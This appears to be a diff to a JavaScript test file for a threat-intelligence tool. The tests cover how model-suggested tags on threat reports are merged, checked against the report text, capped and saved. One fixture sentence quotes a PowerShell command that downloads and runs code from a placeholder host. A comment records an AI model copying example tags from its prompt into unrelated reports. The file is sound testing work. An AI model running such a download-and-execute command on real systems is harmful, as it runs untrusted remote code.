@@ -4,11 +4,17 @@ import {
   sanitizeAiTag,
   mergeReportTags,
   persistAiReportTags,
-  persistReportIntelligence
+  persistReportIntelligence,
+  buildReportTagSupport,
+  isReportTagSupported,
+  namedEntityTagKeys,
+  REPORT_TAG_MAX,
+  REPORT_TAG_CANDIDATE_MAX
 } from './reportIntelligence.js';
 import { validateAiAnalysis, processAiResponseText } from './ai/schema.js';
 import { mergeAnalyses } from './ai/analyze.js';
 import { normalizeAiAnalysisInput } from './ai/normalize.js';
+import { REPORT_TAG_LINE, buildChunkPrompt, buildSynthesisPrompt } from './ai/prompts.js';
 
 const LEGACY_EVIDENCE = 'The report states that victims received phishing emails with malicious links.';
 
@@ -26,13 +32,19 @@ test('sanitizeAiTag reuses space form and rejects filler / IOC-like / empty', ()
   assert.equal(sanitizeAiTag('a'.repeat(50)).reason, 'too_long');
 });
 
-test('mergeReportTags collapses case/hyphen duplicates and caps at 5', () => {
+test('mergeReportTags collapses case/hyphen duplicates and ranks frequency, then first seen', () => {
   const merged = mergeReportTags([
     ['Phishing', 'credential-theft', 'finance'],
     ['phishing', 'PowerShell', 'Windows', 'cloud']
   ]);
-  assert.deepEqual(merged.tags, ['phishing', 'credential theft', 'finance', 'powershell', 'windows']);
-  assert.equal(merged.tags.includes('cloud'), false);
+  assert.deepEqual(merged.tags, ['phishing', 'credential theft', 'finance', 'powershell', 'windows', 'cloud']);
+});
+
+test('mergeReportTags carries at most REPORT_TAG_CANDIDATE_MAX ranked suggestions', () => {
+  const many = Array.from({ length: 14 }, (_, i) => `theme ${String.fromCharCode(97 + i)}`);
+  const merged = mergeReportTags([many.slice(0, 5), many.slice(5, 10), many.slice(10)]);
+  assert.equal(merged.tags.length, REPORT_TAG_CANDIDATE_MAX);
+  assert.equal(merged.proposed, 14);
 });
 
 test('mergeReportTags rejects filler and empty without inventing replacements', () => {
@@ -229,4 +241,171 @@ test('report intelligence persist never touches threat_report_mitre_mappings, ev
   assert.equal(state.links.size, 1);
   assert.equal(state.sql.some((q) => /mitre/i.test(q)), false);
   assert.equal(Object.keys(diag).some((k) => /mitre/i.test(k)), false);
+});
+
+// --- Salience / grounding contract -------------------------------------------
+
+function doc(title, paragraphs, language = 'en') {
+  return {
+    title,
+    language,
+    blocks: [
+      { id: 'b0', type: 'heading', text: title },
+      ...paragraphs.map((text, i) => ({ id: `b${i + 1}`, type: 'paragraph', text }))
+    ]
+  };
+}
+
+const RANSOMWARE_DOC = doc('Ransomware Campaign Targets Telecommunications Providers', [
+  'The ransomware operators breached two telecommunications providers and a water utility.',
+  'Initial access came through exploitation of an internet-facing collaboration server.',
+  'The attackers abused a vulnerable signed driver to disable security products before deployment.',
+  'One host ran: powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a\')"',
+  'The ransomware payload was distributed to every domain host through a Group Policy share.',
+  'Victims included critical infrastructure operators in Europe and Asia.'
+]);
+
+test('a tag the report never discusses is rejected (copied from instructions / general knowledge)', () => {
+  const support = buildReportTagSupport(RANSOMWARE_DOC);
+  assert.equal(support.applies, true);
+  assert.equal(isReportTagSupported('banking', support), false);
+  assert.equal(isReportTagSupported('phishing', support), false);
+  // One word of a two-word concept is not the concept: "credential" alone is not "credential theft".
+  assert.equal(isReportTagSupported('credential theft', support), false);
+  const merged = mergeReportTags([['ransomware', 'banking', 'phishing', 'powershell']], { support });
+  assert.deepEqual(merged.tags, ['ransomware', 'powershell']);
+  assert.deepEqual(
+    merged.rejected.filter((r) => r.reason === 'unsupported').map((r) => r.value),
+    ['banking', 'phishing']
+  );
+});
+
+test('grounding tolerates inflection and spacing, never synonyms', () => {
+  const support = buildReportTagSupport(doc('Report', [
+    'The actor is exploiting SharePoint servers of telecom operators and water utilities.',
+    'It sideloads a DLL and steals credentials from Office 365 tenants. Living off the land binaries were used.'
+  ]));
+  assert.equal(isReportTagSupported('sharepoint exploitation', support), true);
+  assert.equal(isReportTagSupported('telecommunications', support), true);
+  assert.equal(isReportTagSupported('water utility', support), true);
+  assert.equal(isReportTagSupported('dll sideloading', support), true);
+  assert.equal(isReportTagSupported('living off the land', support), true);
+  assert.equal(isReportTagSupported('office365', support), true);
+  assert.equal(isReportTagSupported('credential theft', support), false);
+  assert.equal(isReportTagSupported('critical infrastructure', support), false);
+});
+
+test('grounding does not apply to non-English reports (concepts may be named in English)', () => {
+  const support = buildReportTagSupport(doc('攻击链分析', ['该组织利用伪装安装包植入远控木马。'], 'zh'));
+  assert.equal(support.applies, false);
+  assert.deepEqual(
+    mergeReportTags([['espionage', 'remote access trojan']], { support }).tags,
+    ['espionage', 'remote access trojan']
+  );
+  const unknownLatin = buildReportTagSupport({ ...doc('Report', ['ransomware hits hospitals']), language: null });
+  assert.equal(unknownLatin.applies, true);
+  assert.equal(isReportTagSupported('banking', unknownLatin), false);
+});
+
+test('a theme several chunks carry outranks a one-chunk incidental tool mention', () => {
+  const merged = mergeAnalyses([
+    { summary: 'a', entities: [], candidate_updates: [], relationships: [], report_tags: ['ransomware', 'telecommunications', 'critical infrastructure'] },
+    { summary: 'b', entities: [], candidate_updates: [], relationships: [], report_tags: ['powershell', 'ransomware', 'banking'] }
+  ], { tagSupport: buildReportTagSupport(RANSOMWARE_DOC) });
+  assert.equal(merged.ok, true);
+  const tags = merged.value.report_tags;
+  assert.equal(tags[0], 'ransomware');
+  assert.ok(tags.indexOf('powershell') > tags.indexOf('telecommunications'));
+  assert.equal(tags.includes('banking'), false);
+});
+
+test('provider-style Qwen tag output (mixed case, hyphens) parses, validates and normalizes', () => {
+  const r = processAiResponseText(JSON.stringify({
+    summary: 'ok', entities: [], candidate_updates: [], relationships: [],
+    report_tags: ['Critical-Infrastructure', 'SharePoint exploitation', 'BYOVD', 'telecommunications', 'water utility']
+  }));
+  assert.equal(r.ok, true);
+  assert.deepEqual(mergeReportTags([r.value.report_tags]).tags, [
+    'critical infrastructure', 'sharepoint exploitation', 'byovd', 'telecommunications', 'water utility'
+  ]);
+});
+
+test('persistence links at most REPORT_TAG_MAX tags, in rank order', async () => {
+  const state = { tags: [], links: new Set(), nextId: 10 };
+  const names = ['a1 theme', 'b2 theme', 'c3 theme', 'd4 theme', 'e5 theme', 'f6 theme', 'g7 theme'];
+  const stats = await persistAiReportTags(mockDb(state), 1, names);
+  assert.equal(state.links.size, REPORT_TAG_MAX);
+  assert.equal(stats.accepted, REPORT_TAG_MAX);
+  assert.deepEqual(stats.rejected.map((r) => [r.value, r.reason]), [['f6 theme', 'over_limit'], ['g7 theme', 'over_limit']]);
+});
+
+test('a disabled catalog tag (retired into Threat Classifications) does not use a slot', async () => {
+  const state = {
+    tags: [{ id: 1, name: 'ransomware', slug: 'ransomware', type: 'threat', enabled: false }],
+    links: new Set(),
+    nextId: 10
+  };
+  const names = ['ransomware', 'critical infrastructure', 'telecommunications', 'water utility', 'sharepoint exploitation', 'byovd'];
+  const stats = await persistAiReportTags(mockDb(state), 7, names);
+  assert.equal(stats.accepted, REPORT_TAG_MAX);
+  assert.equal(state.links.size, REPORT_TAG_MAX);
+  assert.equal(state.links.has('7:1'), false);
+  assert.deepEqual(stats.rejected, [{ value: 'ransomware', reason: 'tag_disabled' }]);
+});
+
+test('analyst-added report tags survive AI persistence and do not count toward the AI limit', async () => {
+  const state = {
+    tags: [{ id: 1, name: 'analyst pick', slug: 'analyst-pick', type: 'context', enabled: true }],
+    links: new Set(['3:1']),
+    nextId: 10
+  };
+  await persistAiReportTags(mockDb(state), 3, ['t1 theme', 't2 theme', 't3 theme', 't4 theme', 't5 theme']);
+  assert.ok(state.links.has('3:1'));
+  assert.equal(state.links.size, 6);
+});
+
+test('a tag naming an actor / malware / campaign / tool entity stays an entity; products and sectors stay taggable', () => {
+  const doc8 = doc('Exploitation Delivers a Router RAT', [
+    'The RouterRat implant was deployed after exploitation of FortiGate appliances.',
+    'Telecommunications operators running FortiGate were affected; the RouterRat C2 used a Node.js reverse shell.'
+  ]);
+  const merged = mergeAnalyses([
+    {
+      summary: 'a', candidate_updates: [], relationships: [],
+      entities: [
+        { entity_type: 'malware', name: 'RouterRat', aliases: ['Router-RAT'] },
+        { entity_type: 'organization', name: 'FortiGate' }
+      ],
+      report_tags: ['RouterRat', 'FortiGate exploitation', 'router rat']
+    },
+    {
+      summary: 'b', candidate_updates: [], relationships: [], entities: [],
+      report_tags: ['Router-RAT', 'telecommunications', 'FortiGate']
+    }
+  ], { tagSupport: buildReportTagSupport(doc8) });
+  assert.equal(merged.ok, true);
+  assert.deepEqual(merged.value.report_tags, ['fortigate exploitation', 'telecommunications', 'fortigate']);
+  assert.deepEqual(
+    namedEntityTagKeys([{ entity_type: 'threat_actor', name: 'Storm-0001', aliases: ['Longteeth'] }, { entity_type: 'vulnerability', name: 'CVE-2099-0001' }]),
+    new Set(['storm 0001', 'longteeth'])
+  );
+});
+
+test('the tag instruction defines salience and offers no example tag vocabulary to copy', () => {
+  // semantic-v8 listed example tags; qwen3.5:9b copied them into unrelated reports.
+  for (const word of ['phishing', 'credential theft', 'ransomware', 'powershell', 'banking', 'windows', 'cloud', 'c2', 'infostealer']) {
+    assert.equal(new RegExp(`\\b${word}\\b`, 'i').test(REPORT_TAG_LINE), false, `example tag "${word}" in the tag instruction`);
+  }
+  assert.match(REPORT_TAG_LINE, /WHOLE REPORT/);
+  assert.match(REPORT_TAG_LINE, /title, section headings or key findings/);
+  assert.match(REPORT_TAG_LINE, /only in passing \(one command line/);
+  assert.match(REPORT_TAG_LINE, /never add one from general knowledge or copy words from these instructions/);
+  assert.match(REPORT_TAG_LINE, /threat actors, malware families, campaigns or tools \(those are entities\)/);
+  const chunk = buildChunkPrompt({
+    documentTitle: 'Doc', language: 'en', chunkIndex: 1, chunkTotal: 2,
+    blocksText: 'body', blockIds: ['b0'], toClassify: [], resolved: []
+  });
+  assert.ok(chunk.includes(REPORT_TAG_LINE));
+  assert.match(chunk, /except report_tags: they describe the whole report/);
+  assert.ok(buildSynthesisPrompt({ documentTitle: 'Doc', partialsText: '[]' }).includes(REPORT_TAG_LINE));
 });
